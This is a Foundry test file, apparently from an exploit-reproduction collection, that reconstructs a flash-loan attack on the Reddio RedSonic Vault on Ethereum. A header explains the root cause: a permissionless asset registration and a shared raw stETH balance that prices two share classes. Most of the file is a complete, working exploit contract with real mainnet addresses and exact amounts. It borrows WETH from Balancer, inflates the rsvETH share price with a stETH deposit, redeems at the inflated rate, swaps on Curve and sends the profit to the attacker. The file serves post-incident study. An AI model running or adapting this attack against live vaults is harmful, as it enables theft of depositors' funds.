// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// Reddio RedSonic Vault (RSV) — share-price inflation via a permissionless second-asset
// registration against a shared raw stETH balance — Ethereum. Attacker net gain ~9.25 ETH in a
// single flash-loan-funded contract-creation tx.
//
// Exploit tx   : 0xe3cba90e865c6cba950ebce36a52607f51f1fd33cd9fb920c78803f19b57791a (block 25912201)
// Attacker EOA : 0x70f2333d21Ed7E7D105F6578227A9A747687982C (tx.origin)
// Victim       : 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f (RedSonic Vault, a Diamond/EIP-2535 proxy)
//
// The on-chain exploit was a CONTRACT-CREATION tx (to == null): the whole attack ran inside the
// created contract's constructor, funded by a Balancer flash loan, sending the profit ETH back to
// the create's msg.sender (the attacker EOA). This PoC reconstructs that same attack as ordinary
// Solidity that calls the victim's real functions directly (no bytecode replay), driven from a
// named attack contract whose receiveFlashLoan callback runs the sequence.
//
// Protocol / market addresses:
//   RSV diamond   : 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f (victim vault, EIP-2535 diamond)
//   stETH (Lido)  : 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84 (the asset the attacker registers)
//   WETH          : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (flash-loaned asset)
//   Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8 (WETH flash-loan source)
//   Curve stETH/ETH: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022 (swaps recovered stETH back to ETH)
//
// Root cause (verified against on-chain source of the vault's InvestmentManagerFacet
// 0x47F018dc00307cd48Fd71d489d92e550646598De and the live exploit trace, NOT a key/signer
// compromise):
//
//   1. Share pricing has no per-share-class accounting of the stETH backing the ETH class.
//      getTotalAssetBalance(asset) sums each provider's leg plus getRemainingBalance(asset), and
//      getRemainingBalance for a non-native asset is simply IERC20(asset).balanceOf(vault) — the
//      vault's RAW token balance. The Lido provider leg for the ETH class likewise reads the
//      vault's raw stETH balance. Nothing tracks how much of that raw stETH belongs to the ETH
//      class. (Both getters are in the verified InvestmentManagerFacet; selectors 0x13ef789e and
//      0x001bf8f6.)
//
//   2. registerErc20(address) on the vault is PERMISSIONLESS. In the exploit trace the attacker
//      contract — not the owner — calls it and it succeeds, adding stETH as a second tracked
//      asset (backing the rsvstETH share class).
//
//   Because a direct stETH deposit under the rsvstETH registration lands in the SAME raw stETH
//   balance that the ETH class's pricing already reads, one stETH balance backs both share classes
//   at once. Depositing stETH inflates the rsvETH share price without minting any rsvETH, so
//   redeeming previously-acquired rsvETH pays out at the inflated rate.
//
// Confirmed flow, from the on-chain trace, reproduced below by real calls:
//   1. Flash-loan 1,139.6159... WETH from Balancer; unwrap it to ETH.
//   2. registerErc20(stETH) — permissionless; adds stETH as a second tracked asset.
//   3. depositEth{value: 1,130.2592... ETH} — acquire ~99% of the rsvETH supply.
//   4. Lido submit ~9.3566 ETH -> stETH, approve the vault, depositErc20(stETH, ~9.3366) — inflates
//      rsvETH's share price without minting rsvETH (it lands in the same raw stETH balance the ETH
//      class prices off).
//   5. manualWithdraw(rsvETH, all) — redeem rsvETH at the inflated rate, nets ~1,139.5139 ETH.
//   6. manualWithdraw(rsvstETH, all) — recover the deposited stETH.
//   7. Curve exchange(1, 0, ...) — swap the recovered stETH back to ETH.
//   8. Re-wrap the flash amount and repay Balancer; send the leftover ETH to the attacker EOA.
//
// NOTE on function names: the deposit/redeem/register facet (0x92ecC5DEacB14937867686Ca8b85dd8a65b74704,
// the delegatecall target for depositEth/depositErc20/manualWithdraw/registerErc20/ethVTokenAddress/
// vTokenFromErc20 in the trace) is NOT verified on Etherscan. Those signatures below are the
// canonical 4-byte-directory names for the exact selectors observed in the trace (0x439370b1
// depositEth, 0x6548b40d depositErc20, 0x735fd189 manualWithdraw, 0xa4a3c9ef registerErc20,
// 0xac749536 ethVTokenAddress, 0x95ce754c vTokenFromErc20); each is confirmed only by selector
// match against the on-chain calldata, not by verified source. The pricing getters and the market
// interfaces (Lido, WETH, Curve, Balancer) are from verified source.
//
// Run:
//   forge test --contracts src/test/2026-09/Reddio_exp.sol -vvv

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILidoStETH {
    function submit(address referral) external payable returns (uint256);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ICurveStEthPool {
    // 0: ETH, 1: stETH. exchange(1, 0, dx, min_dy) swaps stETH -> ETH and sends ETH to caller.
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

// Reddio RedSonic Vault (diamond). Selectors verified against the exploit trace; the facet holding
// these is unverified on Etherscan, see the NOTE above.
interface IReddioVault {
    function registerErc20(address erc20) external; // 0xa4a3c9ef, permissionless
    function ethVTokenAddress() external view returns (address); // 0xac749536, rsvETH share token
    function vTokenFromErc20(address erc20) external view returns (address); // 0x95ce754c, rsvstETH share token
    function depositEth() external payable; // 0x439370b1
    function depositErc20(address erc20, uint256 amount) external; // 0x6548b40d
    function manualWithdraw(address vToken, uint256 amount) external; // 0x735fd189, redeem shares
}

contract Reddio_exp is Test {
    address internal constant ATTACKER = 0x70f2333d21Ed7E7D105F6578227A9A747687982C;
    address internal constant RSV_DIAMOND = 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant CURVE_STETH = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    ReddioExploit internal exploit;

    function setUp() public {
        // block-1: real protocol state immediately before the exploit tx executed.
        vm.createSelectFork("http://127.0.0.1:8545", 25912200);
        exploit = new ReddioExploit(ATTACKER);

        vm.label(ATTACKER, "Attacker");
        vm.label(address(exploit), "Exploit");
        vm.label(RSV_DIAMOND, "RedSonicVault");
        vm.label(STETH, "stETH");
        vm.label(WETH, "WETH");
        vm.label(BALANCER_VAULT, "BalancerVault");
        vm.label(CURVE_STETH, "CurveStEthPool");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        uint256 eoaBefore = ATTACKER.balance;
        emit log_named_decimal_uint("attacker ETH before", eoaBefore, 18);

        // The attack runs from the exploit contract; the flash-loan callback executes the full
        // sequence and the recovered profit ETH is forwarded to the attacker EOA (the owner).
        vm.prank(ATTACKER, ATTACKER);
        exploit.attack();

        uint256 eoaGain = ATTACKER.balance - eoaBefore;
        emit log_named_decimal_uint("attacker ETH after", ATTACKER.balance, 18);
        emit log_named_decimal_uint("attacker net gain (ETH)", eoaGain, 18);

        // Net gain matches the reported ~9.25 ETH. On-chain the EOA also paid gas; in the harness gas
        // is not charged to the pranked EOA, so the full payout lands here.
        assertGe(eoaGain, 9 ether, "gain below expected ~9.25 ETH profit");
        assertApproxEqAbs(eoaGain, 9.25 ether, 0.3 ether, "gain off traced ~9.25 ETH");
    }
}

contract ReddioExploit {
    address internal constant RSV_DIAMOND = 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant CURVE_STETH = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    // Attack parameters, taken from the exploit trace. The flash amount is split exactly between
    // the ETH-class deposit and the Lido submit (1,130.2592... + 9.3566... == 1,139.6159...).
    uint256 internal constant FLASH_WETH = 1_139_615_952_950_658_009_506; // Balancer WETH flash loan
    uint256 internal constant DEPOSIT_ETH = 1_130_259_297_504_314_263_299; // depositEth value
    uint256 internal constant STETH_SUBMIT = 9_356_655_446_343_746_207; // ETH submitted to Lido for stETH
    uint256 internal constant STETH_DEPOSIT = 9_336_655_446_343_746_204; // stETH deposited to inflate rsvETH price

    address internal immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");

        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_WETH;
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");

        // Forward the recovered profit ETH to the attacker EOA.
        uint256 profit = address(this).balance;
        (bool ok,) = owner.call{value: profit}("");
        require(ok, "profit transfer failed");
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(tokens[0] == WETH && amounts[0] == FLASH_WETH, "bad flash");

        // 1. Unwrap the flash-loaned WETH to ETH.
        IWETH(WETH).withdraw(FLASH_WETH);

        // 2. Register stETH as a second tracked asset (permissionless). The share token addresses
        //    are read straight from the vault's real getters.
        IReddioVault vault = IReddioVault(RSV_DIAMOND);
        address rsvETH = vault.ethVTokenAddress();
        if (vault.vTokenFromErc20(STETH) == address(0)) {
            vault.registerErc20(STETH);
        }
        address rsvStETH = vault.vTokenFromErc20(STETH);
        require(rsvStETH != address(0), "steth not registered");

        // 3. Acquire ~99% of the rsvETH supply at the pre-inflation price.
        vault.depositEth{value: DEPOSIT_ETH}();

        // 4. Mint stETH via Lido, then deposit it under the stETH registration. This lands in the
        //    same raw stETH balance the ETH class prices off, inflating the rsvETH share price
        //    without minting any rsvETH.
        ILidoStETH(STETH).submit{value: STETH_SUBMIT}(address(0));
        ILidoStETH(STETH).approve(RSV_DIAMOND, type(uint256).max);
        vault.depositErc20(STETH, STETH_DEPOSIT);

        // 5. Redeem all rsvETH at the inflated rate (pays out ETH to this contract).
        vault.manualWithdraw(rsvETH, IERC20(rsvETH).balanceOf(address(this)));

        // 6. Redeem all rsvstETH to recover the deposited stETH.
        vault.manualWithdraw(rsvStETH, IERC20(rsvStETH).balanceOf(address(this)));

        // 7. Swap the recovered stETH back to ETH on Curve (i=1 stETH -> j=0 ETH).
        uint256 stEthBal = ILidoStETH(STETH).balanceOf(address(this));
        ILidoStETH(STETH).approve(CURVE_STETH, stEthBal);
        ICurveStEthPool(CURVE_STETH).exchange(1, 0, stEthBal, 1);

        // 8. Re-wrap the flash amount and repay Balancer. Leftover ETH is the profit.
        uint256 repay = amounts[0] + feeAmounts[0];
        IWETH(WETH).deposit{value: repay}();
        require(IWETH(WETH).transfer(BALANCER_VAULT, repay), "repay failed");
    }

    receive() external payable {}
}
